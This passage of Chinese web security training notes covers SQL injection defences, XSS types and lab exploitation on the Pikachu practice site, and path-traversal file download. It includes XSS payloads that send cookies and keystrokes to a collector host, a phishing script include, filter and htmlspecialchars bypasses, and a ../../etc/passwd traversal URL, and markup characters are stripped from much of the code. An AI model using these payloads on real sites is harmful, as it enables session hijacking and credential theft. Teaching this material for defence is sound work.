identified by 123456; ## mysql8必须分开做： create user user@% identified by 123456; grant all privileges on *.* to user@%; ## table函数 ## table函数为MYSQL8版本中新增的函数，其作用与select类似。 table users; 等同于：select * from users; ## 但是table查询时，显示的始终是表的所有列，而且不可以用where字句来限定某个特定的行。values函数： select * from user union VALUES ROW(2,3); ## 等同于 select * from user union select 2,3; 这些要记下来，注入的时候主要找的就是这三个表，这几个字段 12,SQL注入防护所有的数据库防护手段基本都是一样的，就是对用户提交的数据做严格的过滤。 方式 ## 1、对提交的数据进行数据类型判断，比如id值必须是数字：is_numeric( $id )## 2、对提交的数据进行正则匹配，禁止出现注入语句，比如union、or、and等## 3、对提交数据进行特殊符号转义，比如单引号、双引号等，用addslashs等函数加工一下## 4、不使用sql语句拼接参数的方式来执行sql语句，而是用参数化查询，也叫做参数绑定的方式，对提交的参数进行预编译然后进行参数绑定，这样会将用户提交的注入语句作为参数值来处理，而不是当作sql语句执行，这样可以有效的方法sql注入：不同语言的写法不同，但是原理相同。 $data = $db-prepare( SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1; ); $data-bindParam( :id, $id, PDO::PARAM_INT ); $data-execute(); ## 但是预编译也不能完全解决sql注入问题，比如如果查询语句中表名是动态的，也就是说表名也是用户可以提交过来的数据，根据用户提交的表名来进行不同表数据的查询，那么也会出现sql注入漏洞，因为表名不能进行预编译及参数绑定，下面就报错 $table_name=jaden; $data = $db-prepare( SELECT first_name, last_name FROM (:table_name) WHERE user_id = (:id) LIMIT 1; ); ## 这种就需要配合白名单进行过滤： if ($table_name == jaden) $data = $db-prepare( SELECT first_name, last_name FROM jaden WHERE user_id = (:id) LIMIT 1; ); elif ($table_name == wulaoban) $data = $db-prepare( SELECT first_name, last_name FROM wulaoban WHERE user_id = (:id) LIMIT 1; ); else echo 别乱搞！; ## 5、分级管理：用户的权限要进行严格控制和划分，服务端代码连接数据库使用的用户禁止使用root等高权限用户。比如对用户进行分级管理，严格控制用户的权限，对于普通用户，禁止给予数据库建立、删除、修改等相关权限，只有系统管理员才具有增、删、改、查的权限等等。6、数据库中敏感的数据，比如用户的密码，要加密存储。## 总体来说： ## （1）永远不要信任用户的输入，要对用户的输入进行校验，可以通过正则表达式，或限制长度，对特殊字符和符号进行转换等。 ## （2）永远不要使用动态拼装SQL，可以使用参数化的SQL或者直接使用存储过程进行数据查询存取。 ## （3）永远不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接。 ## （4）不要把机密信息明文存放，请加密或者hash掉密码和敏感的信息。 ## （5）应用的异常信息应该给出尽可能少的提示，最好使用自定义的错误信息对原始错误信息进行包装，把异常信息存放在独立的表中。 9-2 xss跨脚本攻击9-2-1 什么是xssXSS全称（Cross Site Scripting）跨站脚本攻击，为了避免和CSS层叠样式表名称冲突，所以改为了XSS，是最常见的Web应用程序安全漏洞之一，位于OWASP top 10 20132017年度分别为第s三名和第七名，XSS是指攻击者在网页中嵌入客户端脚本，通常是JavaScript编写的危险代码，当用户使用浏览器浏览网页时，脚本就会在用户的浏览器上执行，从而达到攻击者的目的。 ## OWASP（开放式Web应用程序安全项目）是一个开放的社区，由非营利组织 OWASP基金会支持的项目。对所有致力于改进应用程序安全的人士开放，旨在提高对应用程序安全性的认识。其最具权威的就是10项最严重的Web 应用程序安全风险列表，总结并更新Web应用程序中最可能、最常见、最危险的十大漏洞，是开发、测试、服务、咨询人员应知应会的知识。 从上面中的一段话，可以得知，XSS属于客户端攻击，受害者最终是用户，但特别要注意的是网站管理人员也属于用户之一。这就意味着XSS可以进行”服务端”攻击，因为管理员要比普通用户的权限大得多，一般管理员都可以对网站进行文件管理，数据管理等操作，而攻击者一般也是靠管理员身份作为“跳板”进行实施攻击。 XSS攻击最终目的是在网页中嵌入客户端恶意脚本代码，最常用的攻击代码是javascript语言，但也会使用其它的脚本语言，例如：ActionScript、VBscript。而如今的互联网客户端脚本基本是基于Javascript,所以如果想要深入研究XSS，必须要精通Javascript。 大致图解： 9-2-2 xss漏洞出现的原因程序对输入和输出的控制不够严格,导致”精心构造”的脚本输入后,在输出到前端时被浏览器当作有效代码解析执行从而产生危害. 9-2-3 xss的危害1、首先对于那些半年没有更新的小企业网站来说，发生XSS漏洞几乎没有什么用。一般在各类的社交平台，邮件系统，开源流行的Web应用，BBS，微博等场景中，造成的杀伤力却十分强大。 2、劫持用户cookie是最常见的跨站攻击形式，通过在网页中写入并执行脚本执行文件（多数情况下是JavaScript脚本代码），劫持用户浏览器，将用户当前使用的sessionID信息发送至攻击者控制的网站或服务器中。 3、”框架钓鱼”。利用JS脚本的基本功能之一：操作网页中的DOM树结构和内容，在网页中通过JS脚本，生成虚假的页面，欺骗用户执行操作，而用户所有的输入内容都会被发送到攻击者的服务器上。 4、挂马（水坑攻击） 5、有局限性的键盘记录 9-3-4 xss的分类## 反射型：## 与服务端交互，但是交互的数据一般不会被存在数据库中，一次性，所见即所得，一般出现在查询类页面等。## 存储型：## 交互的数据会被存在数据库中，永久性存储，一般出现在留言板，注册等页面。## DOM型：## 不与后台服务器产生数据交互，是一种通过DOM操作前端代码输出的时候产生的漏洞，大部分属于反射型，少部分属于存储型。## 关于非持久型，持久型，Dom型xss## 非持久型xss攻击：顾名思义，非持久型xss攻击是一次性的，仅对当次的页面访问产生影响。非持久型xss攻击要求用户访问一个被攻击者篡改后的链接，用户访问该链接时，被植入的攻击脚本被用户游览器执行，从而达到攻击目的。## 持久型xss攻击：持久型xss，会把攻击者的数据存储在服务器端，攻击行为将伴随着攻击数据一直存在。而Dom型xss属于有可能是持久也可能是非持久型。 4-1 反射型XSS或不持久型XSS(中低危)交互的数据一般不会被存在在数据库里面,只是简单的把用户输入的数据反射给浏览器，一次性，所见即所得。 ?php $name = $_GET[name]; echo Welcome $namebr;? 示例：比如我们将上面的代码放到一个文件中，比如文件名称为xss.php，然后将文件放入到我们的phpstudy的网站目录中去 访问一下看看效果， http://192.168.0.15/xss.php?name=1 ，这个代码很明显没有数据库注入漏洞，但是存在xss漏洞，因为这段代码并没有对用户的参数数据进行过滤处理。 攻击方法 ‘“ ，其中 ‘“ 我们称之为完成闭合符号，后面跟script标签 来进行攻击，弹出了窗口表示我们的js代码被执行了。 并且我们这种弹框的代码是没有什么太大的攻击性的，所以可以作为我们进行xss的漏洞测试。其实对于初级挖洞的人来说，这个代码就够了，但是如果作为攻防中的红方的话，你还需要往下学习更多的手段。 其实xss的代码手段非常多，因为别人可能通过过滤等手段对script标签做了限制，那么你想攻击的话，就要改变方式，所以攻击代码的写法非常多。 在看pikachu网站： ‘“ 效果：出现了弹框，但是在url上显示出了一些script标签内容，其实别人一看比较容易判断这是问题，所以其实攻击性不强 4-2 储存型XSS或持久型XSS（高危）交互的数据会被存在在数据库里面,永久性存储,具有很强的稳定性。 示例： ‘“ 下次再来访问这个页面： 说明，这个攻击代码存储到了数据库里面，每次刷新页面的时候，都会加载这个数据，执行这个js代码，所以这种存储型漏洞很严重。 4-3 DOM XSS(中低危)通过前端的dom节点形成的XSS漏洞，一般不与后台服务器产生数据交互，属于中低危漏洞了。 可能触发DOM型XSS的js操作 document.refererwindow.namelocationinnerHTMLdocument.write 闭合标签： onclick=alert(1111) onclick=alert(xss)img src=# onmouseover=alert(xss)a href=/ascriptalert(1);/scriptwhat do you see?/a 示例： xx onclick=alert(123) 但我们点击a标签的文字时，效果如下： 9-3-5 实战5-1 盗取cookie过程：想要盗取别人的cookie信息的话有一个前提条件，就是你应该在别人触发你的xss攻击时，你的代码应该将收集的cookie信息发送给你的平台来接收，这样才获取到了数据 scriptdocument.location = http://192.168.0.15/pikachu/pkxss/xcookie/cookie.php?cookie= + document.cookie;/script//通过document.location 实例进行重定向到http://http://192.168.0.15/pikachu/pkxss/xcookie/cookie.php?cookie= 1.安装xss后台 2.安装 3.初始化 4.初始化完成，进入首页 5.首页登录 6.登录成功之后的页面效果： 7.点击cookie收集，来到如下页面进行等待，等待收取你攻击获得的数据 http://192.168.31.110/pikachu/vul/xss/xss_stored.php 8.关闭phpstudy的魔法符号 9.回到我们的pikachu页面，这里我们看到有xss攻击的点 10.注入xss攻击代码 scriptdocument.location =http://192.168.0.15/pikachu/pkxss/xcookie/cookie.php?cookie= + document.cookie;/script // 最好对这个代码编码一下，让别人不那么容易看出来，那么这段代码的意思是将获取到的cookie，发送给这个网址的文件 /pikachu/pkxss/xcookie/cookie.php 这个文件将cookie数据保存到了xxs后台系统的数据库中，我们就能在后台看到获取的cookie数据了，我们看一下这个文件，注意header函数中的ip地址要改成我们自己的pikachu项目所在服务器的ip地址昂。这个header跳转也是为了不让对方在网址上看到你的xss代码，迷惑对方用的。 11.注入xss代码，然后访问，注意，如果别人添加cookie的时候，给set_cookie方法设置了那个httponlyTrue参数的话，是不能完成这个攻击的，因为有了这个参数，那么js代码就不能获取cookie了，但是它只针对js生效，什么vscript等前端语言是不受这个参数限制的 13.看xss后台 12.如果效果不好的话，切换一下版本 5-2 反射型XSS(POST)获取cookiepost请求方式的xss攻击其实是比较难实现的，因为要构造一个网页html文件出来 post攻击利用页面 D:\\phpStudy\\WWW\\pikachu\\pkxss\\xcookie\\post.htmlhttp://192.16816.223:90/post.html 示例： 找到这个文件 将里面的ip地址和路径改为这个虚拟机的ip地址和xss后台路径：这个文件我们后面想办法引导别人打开这个文件，当他打开这个文件的时候，就把他的cookie信息发送到了我们的xss后台。 找到pikachu，输入用户名和密码登录这里，admin123456，以后我们可以将这个文件以邮件的形式或者网站页面嵌入的形式诱导别人打开这个文件。我们将这个文件保存到我们的物理机上，通过谷歌浏览器就能玩。 登录成功效果： 然后直接双击打开我们的post.html 打开效果：直接跳转到了如下页面 然后看我们xss后台的cookie信息 拿到了用户的cookie信息。 我们通过这个用户的cookie就能登录网站，如下：我们通过抓包，在打开另外一个浏览器，比如火狐，通过获取来访问一下这个登录页面，应该会提示你让你输入用户名和密码，但是我们在登录成功的chorme上刷新一下页面，抓一个包，然后在火狐上抓一个包，将chorme的包替换到火狐的请求包里面去，当你再放包，你会发现，你在火狐上直接就处于登录状态了。 其实这个反射型主要是做黑产的时候用到的多，我们测试xss攻击点的时候，就弹框就可以了。有些搞黑产的做的弹框可能是提示你，flash啊什么的版本过低，点击下载更新，当你点击下载，下载来的可能就是木马。或者木马绑定在flash里面了，或者盗取你的个人信息等。注意一点，每测试一次就清空一下浏览器的cookie，不然下次再尝试就不容易看到效果了。 5-3 xss钓鱼演示钓鱼的方法有很多，但是这个主要是看你的页面搭建的好不好，是不是和别人正常网站页面的很一样，能不能骗到别人，我们不能做这个昂，违法的。 只要有xss漏洞的地方，都可以做钓鱼。 钓鱼攻击利用页面 D:\\phpStudy\\WWW\\pikachu\\pkxss\\xfish script src=http://192.168.1.12/pikachu/pkxss/xfish/fish.php/script 示例：这次我们通过pikachu的存储型来做实验 我们打开pikachu给我们准备好的钓鱼页面，注意将代码中的IP地址改为我们自己的IP地址昂。 这段代码就是弹出一个对话框，然后将用户在对话框中输入的用户名和密码发送到xfish.php文件中，这个文件做的事情就是将数据保存到数据库中。 打开pikachu的存储型位置，将代码放进入 script src=http://192.168.1.12/pikachu/pkxss/xfish/fish.php/script 输入jaden、123，然后点击登录，然后回到钓鱼结果页面 还有很会在别人网站登录的页面中发现了xss漏洞，比如下面的 当你输入了用户信息之后，点击登录，结果啊，提示你登录超时请重新登录等效果，然后你有输入了一遍用户名和密码，在点击登录的时候，你的用户信息就被拿走了，第二次提示你输入用户名密码的时候，你要注意观察网站的网站是否变化了，看上去很诡异的，编码过的，那么就不要输入了，因为这是别人做的和正常网站一样页面效果的钓鱼网站登录页面，以前qq账号密码就这么丢的。 5-4 xss获取键盘记录演示js的这个监控键盘就的js文件功能不太好昂，简答演示一下 script src=http://192.168.0.15/pikachu/pkxss/rkeypress/rk.js/script 打开下面的文件，修改一下ip地址和路径： 打开pikachu 然后在页面上随便敲一敲键盘，注意只能记录这个钓鱼的页面实现键盘记录昂，比如我敲了888888，效果如下： 5-5 XSS盲打XSS盲打就是攻击者在前端提交的数据不知道后台是否存在xss漏洞的情况下，提交恶意JS代码在类似留言板等输入框后，所展现的后台位置的情况下，网站采用了攻击者插入的恶意代码，当后台管理员在操作时就会触发插入的恶意代码，从而达到攻击者的目的。也就是通过前端插入攻击代码，在后台管理系统中生效。 管理员后台： http://192.168.0.15/pikachu/vul/xss/xssblind/admin_login.php 点击提交之后，没有任何弹框效果，不知道它有没有xss漏洞，因为数据提交到了后台，我们在前端没有看到我们提交的任何数据。 这里有提示后台网址昂 进入后台看一下： 点击登录之后的效果： 那么这里我如果插入的钓鱼代码，弹框效果更加好看一些，提示重新登陆等文字，那么很有可能就能获取到你的后台账号密码。 5-6 XSS绕过（1）对前端的限制可以尝试进行抓包重发或者修改前端的HTML。比如前面的示例中输入框限制只能输入20个字符的那个，这就是限制，但是前端的限制对能力强的攻击者来讲都是无用的。抓包改请求包，或者直接在前端代码中修改等。 （2）防止后台对输入的内容进行正则匹配来过滤输入，对于这样的过滤可以考虑大小写混合输入的方法。比如我们看看代码文件 比如打开xss_01.php看看里面的代码，对script字母进行了替换，这样我们就能把我们的script标签改为大写的形式SCRIPT //再看pikachu， scriptalert(过不去啦！)/script// 被过滤了：没有弹框效果， // 绕过： sCRipTalert(你打篮球像jaden)/sCrIPt 或者别人不用script标签，用什么img、iframe标签之类的。\\ img src=# onerror=alert(jaden)/ （3）防止后台对输入的内容进行替换，采用拼拼凑的输入方法。 这个就是说，别人在后台代码中直接将提交过来的数据中的 例：scscriptriptalert(你打篮球像jaden)/scrscriptipt 5-7 XSS绕过之htmlspecialchars()函数php里面的这个htmlspecialchars()函数把一些预定义的字符转换为 HTML 实体，这个就很厉害了。 // 预定义的字符是：这就是我们学到的html编码 (和号)成为 amp (双引号)成为 quot ’ (单引号)成为#039 (小于)成为 lt (大于)成为 gt// 导致你提交的script标签再输出的时候变成了 ltscriptgt // 该函数的语法：htmlspecialchars(string,flags,character-set,double_encode)过滤原理：htmlspecialchars() 函数把预定义的字符转换为 HTML 实体，从而使XSS攻击失效。但是这个函数默认配置不会将单引号和双引号过滤，只有设置了quotestyle规定如何编码单引号和双引号才能会过滤掉单引号// 可用的quotestyle类型：// ENT_COMPAT - 默认。仅编码双引号，也就是默认情况下不对单引号进行处理// ENT_QUOTES - 编码双引号和单引号// ENT_NOQUOTES - 不编码任何引号 pikachu：下面的代码就不能执行了 绕过： 首先看一下代码，默认是不对单引号处理的 可使用以下语句绕过： q’ safe_onclick’alert(111)’ ，没有什么尖括号之类的了，只有单引号先来个我们平常用的，发现没有效果 再来个 q’ safe_onclick’alert(111)’ 恶意代码执行了，这样就绕过去了。 再看03的代码，改进了，将单引号也干掉了。我们再来试试刚才的代码 然后看pikachu 发现不行了 xss之href绕过： javascript:alert(1111) ## 看一下编码处理：javascript:alert(1111) # 正常javascript:alert(aini) # 正常javascript:alert(/aini/) # 正常 # 对alert中的内容进行unicode编码,也就是所谓的js编码javascript:alert(\\u0031\\u0031\\u0031\\u0031) #不需要引号的数字弹框时，编码之后不能弹框javascript:alert(/\\u006a\\u0061\\u0064\\u0065\\u006e/) #外层是/的话，内容不能正常解析，但是可以弹框javascript:alert(\\u006a\\u0061\\u0064\\u0065\\u006e) #外层是引号的话，内容也可以正常解析，也没有弹框 # 对alert中的内容进行html实体编码(ascii十进制编码)+url编码javascript:alert(%26%2349%3B%26%2349%3B%26%2349%3B%26%2349%3B) # 不需要引号的数字弹框时，编码之后不能弹框javascript:alert(/%26%23106%3B%26%2397%3B%26%23100%3B%26%23101%3B%26%23110%3B/) # 内容不能解析，但是有弹框javascript:alert(%26%23106%3B%26%2397%3B%26%23100%3B%26%23101%3B%26%23110%3B) # 内容不能解析，也没有弹框 # 对整体进行html实体编码(ascii十进制编码)+url编码，不能解析%26%23106%3B%26%2397%3B%26%23118%3B%26%2397%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2358%3B%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B%26%2340%3B%26%2349%3B%26%2349%3B%26%2349%3B%26%2349%3B%26%2341%3B# 对alert进行unicode编码 #可以解析执行javascript:\\u0061\\u006c\\u0065\\u0072\\u0074(1111) # 对alert进行unicode编码+url编码 #可以解析执行javascript:%5Cu0061%5Cu006c%5Cu0065%5Cu0072%5Cu0074(1111) #对javascript进行unicode编码+url编码 #不能解析执行%5Cu006a%5Cu0061%5Cu0076%5Cu0061%5Cu0073%5Cu0063%5Cu0072%5Cu0069%5Cu0070%5Cu0074:alert(1111)# 对javascript进行unicode编码+url编码，不能解析#106;#97;#118;#97;#115;#99;#114;#105;#112;#116;:alert(1111) # 直接编码## 不行解析%26%23106%3B%26%2397%3B%26%23118%3B%26%2397%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B:alert(1111) 5-8 编码绕过htmlhead/headbody input id=xssr_in type=text name=message/ input id=postsubmit type=submit name=submit value=submit / div id=content /div/bodyscriptvar btn = document.getElementById(postsubmit);btn.onclick = function() var val = document.getElementById(xssr_in).value; var content = document.getElementById(content); document.write(val);/script/html 思路：后台有可能会对代码中的关键字进行过滤，但我们可以尝试将关键字进行编码后在插入，浏览器对改编码进行识别时，会翻译成正常的代码。（注意：编码在输出时是否会被正常识别和翻译才是关键，不是所有的编码都是可以的，所以需要研究浏览器到底能够将哪些编码数据能够正常解码显示），大家理解思路即可。到底浏览器能不能解析，谁也不能保准，因为浏览器也一直在升级，解析规则可能会发生变化。 !--浏览器解析顺序是这样的，URL 解析器，HTML 解析器， CSS 解析器，JS解析器URL的解码是在后台服务检测之前的，可以理解为后台收到URL后会自动进行解码，然后才是执行开发人员编写的对URL中的值的检测函数，首先URL编码作用不在于绕过后台检测，但是当我们是GET方式提交数据时，而我们提交的数据中进行了实体编码，也就意味着存在，#这样的特殊字符，这时就需要对这些特殊字符进行URL编码，这样才会保证正常解析，如果不进行URL编码的话，就会把+认为是空格了，而也会是被认为用来连接URL中参数的连接符，故需要进行URL编码。如果是以POST方式传递值，就不需要进行URL编码了。CSS解析器是用来解析CSS代码的，我们暂时先不做研究。我们重点看的是：-- html实体编码（HTML解析器）#十进制; 或者#x十六进制； JS编码（JS解析器） \\u00十六进制，也就是unicode编码html相关的几种编码方式：1、html实体编码 img src=# onerror=alert(aini)/ -- lt;img src=# onerror=alert(jaden)/gt;2、使用十进制的ASCLL编码： 格式：以符号#开头，分号;结尾在线工具： http://tools.gree020.cn/ascii/ https://tool.chinaz.com/tools/unicode.aspx img src=x onerror=#97;#108;#101;#114;#116;#40;#39;#121;#97;#110;#103;#115;#104;#117;#97;#110;#103;#39;#41;/ 注意，作为属性值的时候，外层的双引号不要编码。src=，属性和等于号也不要编码因为会破坏标签属性结构。 img src=x onerror=#34;#97;#108;#101;#114;#116;#40;#39;#121;#97;#110;#103;#115;#104;#117;#97;#110;#103;#39;#41#34;/3、unicode编码 #、#x、\\u 都可以用来表示一串 unicode 编码，unicode编码底层还是用二进制来存储的，显示一般用16进制来表示。 \\u开头和#x开头是一样的都是16进制，只是unicode字符的不同写法，#则是unicode字符的10进制的写法。 \\u形式：浏览器无法解析 img src=#onerror=\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0027\\u006a\\u0061\\u0064\\u0065\\u006e\\u0027\\u0029/#x形式：浏览器可解析 img src=#onerror=#x0061;#x006c;#x0065;#x0072;#x0074;#x0028;#x0027;#x006a;#x0061;#x0064;#x0065;#x006e;#x0027;#x0029;/!--实体编码要在不破坏DOM树的构成，对于有语法结构的标签名、属性名、标签名就不能进行实体编码，对属性的值，标签之间的文本节点能够进行实体编码，而JS编码只能对位于JS解析环境内字符进行编码且不能是括号、双引号、单引号等构成特殊意义的特殊字符，比如alert(1)中的括号就不能进行实体编码，而且在JS编码环境中不会进行实体编码解析，但有一个例外，在javascript伪协议中，比如test，即可以把javascript:alert(‘test’);这一部分看成是标签a的属性href的值，从而能够进行实体编码会被正常实体编码解析，又可以对alert或alert中的字符进行JS编码，但对alert中的字符编码没什么实际作用.如果是输出到了js代码中，再由js代码输出到html中，那么js会先将unicode编码进行解析，然后再输出到html中，这就有了html标签效果。如下：--scriptvar btn = document.getElementById(postsubmit);btn.onclick = function() var val = document.getElementById(xssr_in).value; var content = document.getElementById(content); document.write(\\u003c\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003e\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0032\\u0033\\u0029\\u003b\\u003c\\u002f\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003e);/script 5-9 xss之js输出 提交之后，查看网页源代码，发现了这段代码 构建xss攻击代码， 前面的代码被 闭合了，后面我写了新的script标签内容 1111/scriptscriptalert(过不去啦！)/script; // 闭合前面的script标签 script $ms=1111/scriptscriptalert(过不去啦！)/script; if($ms.length != 0) if($ms == tmac) $(#fromjs).text(tmac确实厉害,看那小眼神..) else // alert($ms); $(#fromjs).text(无论如何不要放弃心中所爱..) /script 将这个改后的代码注入提交 所以，前端代码还是不靠谱的，总是可以注入，因为可以构造。 5-10 XSS之httponly绕过xss攻击手段获取cookie。 HttpOnly是包含在http响应头Set-Cookie里面的一个附加的标识，所以它是后端服务器对cookie设置的一个附加的属性，在生成cookie时使用HttpOnly标志有助于减轻客户端脚本访问受保护cookie的风险（如果浏览器支持的话），大多数XSS攻击都是针对会话cookie的盗窃。后端服务器可以通过在其创建的cookie上设置HttpOnly标志来帮助缓解此问题，这表明该cookie在客户端上不可访问。如果支持HttpOnly的浏览器检测到包含HttpOnly标志的cookie，并且客户端脚本代码尝试读取该cookie，则浏览器将返回一个空字符串作为结果。这会通过阻止恶意代码（通常是XSS）将数据发送到攻击者的网站来使攻击失败。 如果HTTP响应标头中包含HttpOnly标志（可选），客户端脚本将无法访问cookie（如果浏览器支持该标志的话）。因此即使客户端存在跨站点脚本（XSS）漏洞，浏览器也不会将Cookie透露给第三方。但是如果浏览器不支持HttpOnly，并且后端服务器设置了HttpOnly cookie，浏览器也会忽略HttpOnly标志，从而创建传统的，脚本可访问的cookie。那么该cookie（通常是会话cookie）容易受到XSS攻击。这里大家要注意一个问题 httponly不是防止xss攻击的，而是防止xss攻击代码中的js代码在浏览器上获取cookie信息。 各语言设置cookie的httponly java response.setHeader(Set-Cookie, cookiename=value; Path=/;Domain=domainvalue;Max-Age=seconds;HTTPOnly); C# HttpCookie myCookie = new HttpCookie(myCookie); myCookie.HttpOnly = true; Response.AppendCookie(myCookie); PHP4 setcookie(ant[uname],$_POST[username],time()+3600,NULL,NULL,NULL,true); 其实我们登录后台有两种方式，方式1：直接用户名和密码登录 方式2：通过cookie、token等认证信息直接登录。大多数XSS攻击都是针对会话cookie的盗窃。当用户通过用户名和密码登录某网站之后，浏览器可能会提示他保存用户名和密码，那么用户为了方便，很有可能点击了保存。如果是这种情况的话，我们可以想办法来读取浏览器保存的用户名和密码信息。如果用户登录之后没有保存，那么我们可以采用表单劫持的方法来获取用户名和密码。**** 5-11 表单劫持表单劫持的前提条件是登录页面存在存储型xss漏洞，我们先通过这个xss漏洞注入我们的xss攻击代码，攻击代码中包含获取表单数据并发送给攻击者网站的能力，然后当其他用户访问登录页面的时候，我们的xss攻击代码被加载执行了，当用户输入完用户名和密码点击提交的时候，给网站后台发送了请求的同时也给攻击者发送了用户名和密码，当然了，也可以通过js的键盘记录监控来获取用户输入的用户名和密码。 表单劫持的前提条件其实就不好满足，所以表单劫持的这种手法比较鸡肋。 5-12 获取浏览器保存的密码获取如下登录页面的用户名和密码 登录页面html代码如下： 攻击js代码大致如下 主要是产生在后台的存储型xss攻击，如留言板等功能，当攻击代码被加载之后，会自动读取浏览器保存的用户名和密码。 好，我们先记住这些攻击绕过手段即可。xss的几个攻击手段，我们就说这么多了。 5-13 XSS常规防范XSS防御的总体思路是：对输入进行过滤，特殊符号必须过滤掉，单引号、双引号、尖括号之类的，对输出进行编码 过滤：根据业务需求进行过滤，比如输出点要求输入手机号，则只允许输入手机号格式的数字。 转义：所有输出到前端的数据都根据输出点进行转义，比如输出到html中进行html实体转义，输入到JS里面的进行JS转义() xss之href输出绕过： javascript:alert(1111) ，直接代入a标签herf里面一样可以绕过htmlspecialchars，如果没有把用户提交的数据交给a标签，其实很难绕过了。xss之js输出绕过 script $ms=11/scriptscriptalert(1111)/script ; if($ms.length != 0) if($ms == tmac) $(#fromjs).text(tmac确实厉害,看那小眼神..) else // alert($ms); $(#fromjs).text(无论如何不要放弃心中所爱..) /script 输入语句： 2/scriptscriptalert(1111)/script 5-14 同源和跨域(1)、什么是跨域http:// www. jaden.cn :80 /news/index.php协议 子域名 主域名 端口 资源地址当协议、主机(主域名，子域名)、端口中的任意一个不相同时，称为不同域。我们把不同的域之间请求数据的操作，成为跨域操作。不同域示例：http://www.jaden.cn:80 http://www.jaden.cn:81 https://www.jaden.cn:80 http://www.jadens.cn:80 不同域之间进行沟通，叫做跨域(2)、同源策略 对于js代码来说，为了安全考虑，所有浏览器都约定了“同源策略”，同源策略禁止页面加载或执行与自身来源不同的域的任何脚本，既不同域之间不能使用JS进行操作。比如：x.com域名下的js不能操作y.com域名下的对象。 那么为什么要有同源策略？ 比如一个恶意网站的页面通过js嵌入了银行的登录页面（二者不同源），也就是说恶意的请求了其他网站的页面或者数据，拿到自己的页面上使用，如果没有同源限制，恶意网页上的javascript脚本就可以在用户登录银行的时候获取用户名和密码。 Tips:下面这些标签跨域加载资源是不受同源策略限制的，(但是资源类型是有限制的)script src=... //加载js执行img src=... //图片link href=... //cssiframe src=... //任意资源a href=... // 超链接地址 (3)、同源策略修改D:\\phpStudy\\WWW\\pikachu\\pkxss\\rkeypress\\rkserver.php 同之前的案例到后台设置好Access-Control-Allow-Origin，设置为*，既允许所有人访问。一般公司的网站后台都不会设置*号的。(4）rk.js关键代码解读var realkey = String.fromCharCode(event.keyCode); //获取用户键盘记录，最后转化为字符串xl+=realkey; //赋值给x1show(); //调用show涵数，通过下面ajax进行post发送键盘记录人内容输入设置好的恶意JS代码：script src=http://192.168.0.15/pikachu/pkxss/rkeypress/rk.js/script然后在键盘上随意输入，就可以到xss平台上去查看键盘输入的结果 跨域报错： 或者这里： cors跨域 jsonp跨域 htmlhead/headbody buttongo/button/body!-- 页面会提示同源机制的报错 script src=https://cdn.bootcdn.net/ajax/libs/jquery/3.6.4/jquery.js/script script $.ajax( type:get, url:http://192.168.2.106/pikachu/pkxss/rkeypress/test.php, dataType:jsonp, success:function(res) console.log(res); ) /script--script document.querySelector(button).onclick = function() var sc = document.createElement(script); sc.src=http://192.168.2.106/pikachu/pkxss/rkeypress/test.php?cb=fn; document.body.append(sc); function fn(data) console.log(data); /script/html test.php ?php $fn = $_GET[cb]; echo $fn.(username=jadenpassword=666); ? 总结 jsonp跨域： 首先声明一个js函数，这是我们的回调函数，比如函数名称为jaden，再基于script标签的src属性的跨域特性来发送网络请求，携带一个回调函数参数，函数名称为我们声明的jaden，服务端响应回了jaden(‘数据’)，那么我们自己声明的jaden函数就拿到了服务端的响应数据。 9-3-6 20关练习6-1 第一关没有任何防范 scriptalert(jaden);/script 6-2 第二关可以看到在 标签这里他将 和 进行了编码，而在输入 这个标签中，他是没有被编码的，但是可以看到我们的注入语句被放到了value 值当中，这样浏览器是不会执行我们的注入语句的，所以我们要构造闭合 ‘“ 好，那我们换标签，比如img标签 http://192.168.2.106/xss-labs/level1.php?name=jaden![](1) 注意不要让src#，#会影响输入，有注释的效果，而且img标签的后面结尾处把删除，也就是把删除。 值得注意的是，网址外层要加上单引号，如下 http://192.168.2.106/xss-labs/level15.php?src=http://192.168.2.106/xss\u0002labs/level1.php?name=jaden![](1)‘ 6-15 第十六关正常测试 发现空格被实体编码了 尝试用换行替换空格的方式进行绕过，可以先将换行进行url编码 %0D%0A ，因为在html中换行和多个空格都是按照一个空格进行处理的，然后测试： http://192.168.2.106/xss-labs/level16.php?keyword=%3Cimg%0D%0Asrc=1%0D%0Aonerror=alert(%22jaden%22)%3E 6-16 第十七关embed标签可以理解为定义了一个区域，可以放图片、视频、音频等内容，但是呢相对于他们，embed标签打开不了文件的时候就会有块错误的区域。也可以绑定各种事件，比如尝试绑定一个onmouseover事件。后台看代码用了htmlspecialchars，所以直接写标签是不行的。embed标签基本不怎么用了，所以这一关就简单了解一下即可。 ‘ safe_onmouseoveralert(“aini”) 6-17 第十八关j 9-3 任意文件上传下载9-3-1 任意文件下载1 -1 示例 看一下图片的网址 网址： http://192.168.0.15/pikachu/vul/unsafedownload/execdownload.php?filename=kb.png 看到这样的网址，我们上来的反应是sql注入点、xss攻击等手段，现在还需要考虑有没有任意文件下载漏洞，比如改一个文件名会怎样呢？会不会下载这个文件名的文件呢？先看一下文件所在目录 那么网址路径和物理路径的对应关系如下：但是注意，物理路径的最后一个download文件夹是没有在网址路径上体现出来的，通过filename参数对应的文件名称，后台代码肯定是去download文件夹里面找对应的文件了 我们再来看， ......index.php ，从download文件夹开始往上层走，找到了如下pikachu文件夹，将里面的文件下载下来了。 效果：index.php被下载下来了，这就叫做任意文件下载。这样的漏洞现在还有好多。 1-2 产生原因 写代码的时候，代码规定一个绝对路径，只能在某个文件夹里面下载文件，这样就能防止这个漏洞，但是很多程序员不知道这个问题，导致了漏洞。另一个防御方法，就是将 .. 之类的符号屏蔽或者过滤掉。 很多网站还会出先如下的问题，就是写很多很多层的 .. http://192.168.0.15/pikachu/vul/unsafedownload/execdownload.php?filename=../../../../../../../../../../../../../../../etc/passwd ## 通过....等切换目录，也叫做目录穿越漏洞。 很明显，这个层级是不存在的，那么如果没有对路径进行处理的话，很有可能默认就直接返回了系统根路径，那么就拿到了根路径下面的etc下面的passwd文件。 1-3 